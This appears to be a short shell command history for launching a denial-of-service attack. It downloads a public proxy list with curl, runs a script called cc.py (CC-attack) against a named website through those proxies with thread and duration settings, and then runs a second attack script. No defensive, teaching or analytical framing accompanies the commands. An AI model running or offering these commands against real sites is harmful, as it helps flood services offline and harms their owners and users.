curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt
python3 ~/CC-attack/cc.py -url http://fwe22.top/ -f ~/proxy.txt -v 5 -s 30
python3 ~/HydaelynAttack/HydaelynAttack_p_once_noLog.py
